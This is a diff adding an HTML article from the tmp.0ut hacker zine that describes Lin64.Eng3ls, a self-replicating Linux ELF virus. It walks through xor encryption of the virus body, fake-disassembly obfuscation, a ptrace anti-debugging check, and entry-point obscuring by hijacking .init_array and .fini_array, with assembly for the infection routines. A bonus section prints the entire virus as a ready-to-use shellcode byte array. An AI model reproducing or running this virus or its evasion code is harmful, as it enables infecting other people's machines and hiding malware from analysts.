@@ -1,0 +1,280 @@
+<html>
+<head>
+<title>tmp.0ut</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+@font-face { font-family: "gohu"; src: url("gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+         a { color: #93ffd7; text-decoration: none; }
+</style>
+</head>
+<body>
+<center><div style="display: inline-block; text-align: left;"><pre>
+                                                            ┌───────────────────────┐
+                                                            ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                            │ █   █ █ █ █   █       │
+                                                            │ █   █ █ █ █▀▀▀▀       │
+                                                            │ █   █   █ █     ▄     │
+                                                            │                 ▄▄▄▄▄ │
+                                                            │                 █   █ │
+                                                            │                 █   █ │
+                                                            │                 █▄▄▄█ │
+                                                            │                 ▄   ▄ │
+                                                            │                 █   █ │
+                                                            │                 █   █ │
+                                                            │                 █▄▄▄█ │
+                                                            │                 ▄▄▄▄▄ │
+                                                            │                   █   │
+Lin64.Eng3ls: Some anti-RE techniques in a Linux virus      │                   █   │
+~ S01den & sblip                                            └───────────────────█ ──┘
+
+Written with love by S01den.
+mail: S01den@protonmail.com
+
+--- Introduction ---
+
+With Sblip, we worked during a whole week-end on Lin64.Eng3ls for a private event.
+Eng3ls is basically Lin64.Kropotkine[0], the infection method is still the same good
+old PT_NOTE to PT_LOAD segment, but we added some obfuscation techniques.
+
+Indeed, Kropotkin isn't stealth at all: the entrypoint of infected binaries is
+modified to directly point to the virus and the viral code is clear (so easy to
+analyse...).
+
+To solve these problems, we made a oligomorphic xor decryptor/encryptor (not fancy at
+all I know...) for the virus body, the key changing in every new infected binary so
+that every replicated code is different.
+
+However this poor man's polymorphism has the great disavantage that the decryptor's
+code doesn't change.
+
+Thus, without more witchcraft, a reverser would understand very quickly how the
+virus is encrypted, and what it does.
+
+That's why I've implemented for the first time in one of my virus, the polymorphic
+false-disassembly technique (or simply "fake polymorphism") in order to obfuscate
+the decryptor.
+
+Check the paper I wrote about this technique to see how it works and the results!
+(basically turn the page of the zine)
+
+But there was still a problem: the entrypoint of infected binaries directly points
+to the virus, that's not stealth at all!
+Let's see how we've solved this...
+
+--- An Entry-Point Obscuring Technique for ELF ---
+
+/!\ This technique doesn't work with PIE binaries /!\
+
+Entrypoint Obscuring is simply the action, for a virus, to hide the address of it's
+first instruction.
+
+In non-EPO viruses, the entrypoint of an infected program is modified to point to 
+the beginning of the virus, whereas in EPO viruses, the virus is called in another
+way, whether by hiding a jump in the host's code or by, like here, abusing a 
+specificity of the executable file format.
+
+In ELFs the entrypoint is, in fact, not the first address to be executed when the 
+program is run.
+
+There is some glibc initialization routines, which ultimately load main().
+
+I won't explain in details how it works, there is already a cool paper about[1].
+Just keep in mind that we'll hijack the sections .init_array and .fini_array, which
+respectively contains a pointer to the constructor and a pointer to the destructor
+of the binary.
+
+Thus, the address of the code located in .init_array is executed before the 
+EntryPoint. That's exactly the kind of thing we wanted to have!
+
+I chose to implement a tiny anti-debugging technique first, a ptrace check to see if
+the current process is traced (so debugged or straced) or not.
+The classical "if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) exit(0);"...
+Easy to bypass (patch the virus or set rax = 0 in gdb at the comparaison)...
+So I made it "hard" (not really) to detect!
+
+------------------------- CUT-HERE --------------------------------------------------
+check_dbg:
+    push rbp
+    mov rbp, rsp
+
+    jmp jmp_over4+2
+    jmp_over4:
+      db `\x41\xba` ; false disassembly
+    mov rax, 101 ; sys_ptrace
+    xor rdi, rdi ; PTRACE_TRACEME
+    xor rsi, rsi
+    xor r10, r10
+    xor rdx, rdx
+    inc rdx
+    jmp jmp_over6+2
+    jmp_over6:
+      db `\xe9\x94` ; false disassembly
+    syscall
+
+    jmp jmp_over5+2
+    jmp_over5:
+      db `\x49\x81` ; false disassembly
+    cmp rax, 0
+    jge continue
+    mov rax, 60
+    xor rdi, rdi
+    syscall
+
+    continue:
+    pop rbp
+    ret
+-------------------------------------------------------------------------------------
+
+I wrote some false-disassembly bytes (changing at ever new infection) in the routine
+and I made it called before main() by abusing .init_array.
+Thus, if debugged, the virus stops its execution, even with a breakpoint on the
+entrypoint.
+
+Concerning the virus in itself, I made it called at the end, by abusing .fini_array.
+Here is the routines I wrote for parsing the section header table in the search
+of .init_array and .fini_array, and for patching them.
+
+------------------------- CUT-HERE --------------------------------------------------
+parse_shdr:
+  xor rcx, rcx
+  xor rdx, rdx
+  mov cx, word [rax+e_hdr.shnum]     ; rcx = # of entries in the program header table
+  mov rbx, qword [rax+e_hdr.shoff]   ; rbx = offset of the program header table
+  mov dx, word [rax+e_hdr.shentsize] ; rdx = size of a program header table entry
+
+  loop_shdr:
+    add rbx, rdx
+    dec rcx
+    cmp dword [rax+rbx+e_shdr.type], 0x0E ; 0x0F = SHT_INIT_ARRAY, the section we're 
+                                          ; looking to modify to put the debugging 
+                                          ; check (.init_array)
+    je ctor_found
+    cmp dword [rax+rbx+e_shdr.type], 0x0F ; 0x0F = SHT_FINI_ARRAY, the section we're 
+                                          ; looking to modify to EPO (.fini_array)
+    je dtor_found
+    cmp rcx, 0
+    jg loop_shdr
+
+dtor_found:
+  mov rdi, qword [rax+rbx+e_shdr.offset]
+  mov [rax+rdi], r9 ; r9 holds the addr of the converted segment, the one where we
+                    ; are writing the virus
+  jmp write_vx
+
+ctor_found:
+  mov rdi, qword [rax+rbx+e_shdr.offset]
+  add r9, 0x86 ; r9+0x86 = the addr where check_dbg begins
+  mov [rax+rdi], r9
+  sub r9, 0x86
+  jmp loop_shdr
+-------------------------------------------------------------------------------------
+
+--- Conclusion ---
+
+Entrypoint modification is lame, use EntryPoint Obscuring tricks such as .init_array
+or .fini_array hijacking instead.
+
+Add some funny anti-RE tricks to spice your viruses: a pinch of encryption here, a
+spoonful of debugger detection over there...
+
+I hope you enjoyed this article and that you learned something.
+
+If you want to go further, I wrote a crackme using the same anti-reverse-engineering
+techniques that eng3ls uses.
+
+Check that here: https://crackmes.one/crackme/6049f27f33c5d42c3d016dea
+
+--- Bonus ---
+
+I wrote a null-byte free version of this virus.
+Null-byte free code + Position Independent = shellcode \o/
+So here is a shellcode version of the virus:
+
+unsigned char shellcode[] = 
+    "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc9\x4d"
+    "\x31\xc0\x49\x89\xe6\x48\x81\xc4\xe8\xc3\x11\x11\x48\x81\xec\xde"
+    "\xc0\x11\x11\x49\x89\xe7\xeb\x7c\x58\x48\x2d\x87\xc1\x11\x11\x48"
+    "\x05\xde\xc0\x11\x11\x50\x41\x5c\x68\xe8\xc3\x11\x11\x5e\x48\x81"
+    "\xee\xde\xc0\x11\x11\x48\x81\xc6\xe8\xc3\x11\x11\x48\x81\xee\xde"
+    "\xc0\x11\x11\x48\x31\xff\x6a\x07\x5a\x6a\x22\x41\x5a\x6a\x09\x58"
+    "\x0f\x05\x48\x89\xc3\x56\x59\xb0\x54\x48\x31\xd2\x41\x8a\x14\x3c"
+    "\x48\x81\xc7\xde\xc0\x11\x11\x48\x81\xff\x86\xc1\x11\x11\x76\x02"
+    "\x30\xc2\x48\x81\xef\xde\xc0\x11\x11\x88\x14\x3b\x48\xff\xc7\xe2"
+    "\xdb\x49\x89\xdf\x48\x81\xc3\x87\xc1\x11\x11\x48\x81\xeb\xde\xc0"
+    "\x11\x11\xff\xe3\xe8\x7f\xff\xff\xff\x1c\xd5\x90\x5e\x57\x54\x54"
+    "\x1c\xd5\x90\x5e\x57\x54\x54\x1c\xd5\x90\x54\x55\x54\x54\xbd\x6b"
+    "\x56\x54\x54\x0b\xec\x56\x54\x54\x54\x1c\x65\xa2\x5b\x51\x1c\xdd"
+    "\x93\xec\x8d\x54\x54\x54\x1c\xdd\xb2\xee\x54\x50\x54\x54\x5b\x51"
+    "\x1c\xd7\xac\x54\x5b\xd8\xb1\x55\x54\x54\x1d\xdd\x91\x1c\x65\x8f"
+    "\x1c\xdd\xb4\x1c\xd7\x94\x47\x1c\xdd\x92\xeb\x55\x54\x54\x54\x1c"
+    "\x65\x9d\xde\x18\x70\x46\x07\xbc\x42\x54\x54\x54\x0f\x32\xdf\x10"
+    "\x70\x44\x1c\x55\x97\x1c\x55\x90\x18\x6d\xbf\x28\x87\xbd\xf9\x55"
+    "\x54\x54\x1c\xdd\xb1\x1c\xd7\xad\x5c\x21\x05\x1c\xdd\xa3\xec\x56"
+    "\x54\x54\x54\xea\x56\x50\x54\x54\x5b\x51\x1c\xd7\xac\x54\x2a\x68"
+    "\x1c\xdd\x97\x1c\xdd\xb2\x18\x7d\xba\xec\x50\x54\x54\x54\x5b\x51"
+    "\x1d\xdd\x8c\x1c\xdf\x22\x64\xeb\x54\x54\x54\x54\xee\x52\x54\x54"
+    "\x54\x19\x65\x9d\x15\xee\x55\x54\x54\x54\x1c\x65\x94\xec\x5d\x54"
+    "\x54\x54\x5b\x51\xd5\x6c\x2b\x11\x18\x12\x20\x45\xec\x57\x54\x54"
+    "\x54\x1c\xdd\x8b\x5b\x51\x1c\x65\x94\x1c\xdd\xb8\x97\xd4\x2c\x50"
+    "\x56\x20\x56\xbf\xb3\x32\xd7\x2c\x44\x56\x20\x56\xbf\x8a\xd5\x2c"
+    "\x5d\x8a\x94\xf9\x8a\x21\x53\x1c\x65\x94\x1c\xdd\xb8\x97\x1c\x65"
+    "\x9d\x1c\x65\x86\x32\xdf\x1c\x6c\x1c\xdf\x0c\x74\x32\xdf\x04\x62"
+    "\x1c\x55\x87\x1c\xab\x9d\xd7\x68\x4c\x50\x20\x52\x1c\xd7\xad\x54"
+    "\x2b\xba\x93\x14\x5d\x8a\x94\xf9\x8a\x93\x50\x4c\x55\x54\x54\x54"
+    "\x93\x10\x4c\x50\x53\x54\x54\x54\x15\xed\x54\x54\x54\x58\x1d\x55"
+    "\xa5\x18\xdd\x18\x4c\x44\x1c\xdf\x28\x4c\x74\x1c\xd5\x93\x5e\x57"
+    "\x54\x54\x1c\xdd\x28\x4c\x74\x1c\xdf\x28\x4c\x7c\x1c\xd5\x93\x5e"
+    "\x57\x54\x54\x1c\xdd\x28\x4c\x7c\x1c\xdd\x20\x4c\x5c\x1c\x65\x9d"
+    "\x1c\x65\x86\x32\xdf\x1c\x68\x1c\xdf\x0c\x7c\x32\xdf\x04\x6e\x1c"
+    "\x55\x87\x1c\xab\x9d\xd7\x28\x4c\x50\x5b\x20\x52\x1c\xd7\xad\x54"
+    "\x2b\xb9\x1c\xdf\x28\x4c\x4c\x18\xdd\x58\x6c\xee\x50\x54\x54\x54"
+    "\x1c\xdd\x93\xec\x4e\x54\x54\x54\x5b\x51\xec\x5f\x54\x54\x54\x5b"
+    "\x51\x5b\x65\x32\x61\xf9\x8a\x15\xde\x1b\x3c\x15\xdc\x13\x3c\x1c"
+    "\x65\x86\x1c\x65\x8f\x15\xde\x48\x43\x15\xdc\xc8\x43\x5e\x57\x54"
+    "\x54\x1c\xab\x96\x1c\xd5\xae\xfd\x54\x54\x54\x21\xbc\x15\xde\x48"
+    "\x43\x64\x97\x15\xdc\xc8\x43\x5e\x57\x54\x54\x1c\xab\x96\x1c\xd5"
+    "\xae\x5e\x57\x54\x54\x21\xb2\x18\xdd\x93\x18\xdd\xaa\x1c\xd5\x92"
+    "\x5e\x57\x54\x54\xee\x5e\x57\x54\x54\x1c\xd7\x96\x7a\xec\x55\x54"
+    "\x54\x54\x5b\x51\xec\x57\x54\x54\x54\x5b\x51\x1c\xdd\xb8\x97\xec"
+    "\x55\x54\x54\x54\x1c\x65\xab\x1c\xab\x93\x3c\x5e\x0c\x0b\x0c\x1c"
+    "\xdd\xb2\xee\x50\x54\x54\x54\x5b\x51\xec\x68\x54\x54\x54\x5b\x51"
+    "\x1c\x65\x9d\x1c\x65\x8f\x1c\x65\x94\x1c\x65\x86\x97\x1c\xdf\x50"
+    "\x70\x97\xbc\xe8\xa9\xab\xab\x7a\x54\x54";
+
+Don't be stupid, don't spread this shit into the wild.
+We don t take responsibility for what you do with this
+
+--&gt; two techniques to write nullbytes-free codes:
+
+1) Replace mov instructions by push.
+Example:
+
+b809000000     mov eax, 9  ----&gt; 6a09 push 0x9
+                                 58   pop rax
+2) The add/sub technique:
+Sometimes the values you add to a register involves nullbytes.
+You can remove them by adding and subbing a garbage value.
+Example:
+
+4881c4890300  add rsp, 0x389  ----&gt; 4881c4e8c311  add rsp, 0x1111c3e8
+          ^                         // 0x1111c3e8 = 0x389 + 0x1111c0de
+                                    4881ecdec011  sub rsp, 0x1111c0de
+
+
+--- Notes and References ---
+[0] https://github.com/vxunderground/MalwareSourceCode
+      /blob/main/VXUG/Linux.Kropotkine.asm
+[1] Abusing .CTORS and .DTORS for fun 'n profit
+    https://www.exploit-db.com/papers/13234
+
+--- Source ---
+
+- <a href="Linux.Eng3ls.asm">Linux.Eng3ls.asm</a>
+</pre></div></center></body></html>
